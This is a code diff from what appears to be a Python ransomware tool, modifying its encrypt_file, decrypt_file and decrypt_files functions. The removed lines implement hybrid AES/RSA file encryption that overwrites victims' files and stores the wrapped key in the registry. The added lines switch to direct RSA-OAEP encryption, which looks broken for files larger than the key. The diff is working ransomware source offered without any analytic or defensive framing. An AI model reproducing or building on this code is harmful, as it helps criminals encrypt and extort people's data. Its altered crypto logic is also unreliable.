@@ -274,32 +274,24 @@ def encrypt_file(filename, rsa_key):
         if not os.path.isfile(filename):
             log("File '{}' not found".format(filename))
             return f"file {filename} not found"
+
         log(f"attempting to encypt: {filename}")
+        print(f"attempting to encypt: {filename}")
         # if not os.path.splitext(filename)[1] in globals()['filetypes']:
         #     return "Error! Attempting the encrypt unsupported filetype"
 
         # if not isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
         #     return "Error! rsa_key passed into encrypt_file is not valid."
 
-        cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
-        aes_key = os.urandom(32)
+        cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key.publickey())
 
         with open(filename, 'rb') as fp:
             data = fp.read()
 
-        ciphertext = encrypt_ransom_aes(data, aes_key)
+        ciphertext = cipher.encrypt(data)
 
         with open(filename, 'wb') as fd:
             fd.write(ciphertext)
-
-        key = base64.b64encode(cipher.encrypt(aes_key))
-
-        if sys.platform == 'win32':
-            registry_key(globals()['registry_key'], filename, key)
-        elif sys.platform == 'linux' or sys.platform == 'linux2':
-            # Write to encryption_dictionary. Whole dict gets written at end of func
-            encryption_dictionary[filename] = aes_key
-
 
         log('{} encrypted'.format(filename))
         return '{} encrypted'.format(filename)
@@ -309,7 +301,7 @@ def encrypt_file(filename, rsa_key):
         return "{} error: {}".format(encrypt_file.__name__, str(e))
 
 
-def decrypt_file(filename, key):
+def decrypt_file(filename, rsa_key):
     """
     Decrypt a file that was encrypted with AES-256-OCB encryption
 
@@ -325,20 +317,20 @@ def decrypt_file(filename, key):
         return f"file {filename} not found"
 
     try:
-            with open(filename, 'rb') as fp:
-                ciphertext = fp.read()
+        with open(filename, 'rb') as fp:
+            ciphertext = fp.read()
 
-            try:
-                plaintext = decrypt_ransom_aes(ciphertext, key)
-            except Exception as e:
-                log(f'error decoding ransom aes {e}')
-                return f'error decoding ransom aes {e}'
 
-            with open(filename, 'wb') as fd:
-                fd.write(plaintext)
+        cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
+ 
 
-            log('{} decrypted'.format(filename))
-            return '{} decrypted'.format(filename)
+        plaintext = cipher.decrypt(ciphertext)
+
+        with open(filename, 'wb') as fd:
+            fd.write(plaintext)
+
+        log('{} decrypted'.format(filename))
+        return '{} decrypted'.format(filename)
 
     except Exception as e:
         log("{} error: {}".format(decrypt_file.__name__, str(e)))
@@ -397,7 +389,7 @@ def decrypt_files(action):
 
 
     output = shlex.split(action)
-    print(f'\noutput into decrypt:\n{output}\n')
+
     rsa_key = output[2]
     target = output[0]
     # location, pub, priv
@@ -411,14 +403,9 @@ def decrypt_files(action):
         if not rsa_key.has_private():
             return "Error: RSA key cannot decrypt"
 
-        cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
-        aes_key = os.urandom(32)
-
         if os.path.isfile(target):
-            res = decrypt_file(target, aes_key)
+            res = decrypt_file(target, rsa_key)
             return res
-
-
 
         if os.path.isdir(target):
             # globals()['threads']['iter_files'] = _iter_files(rsa_key)
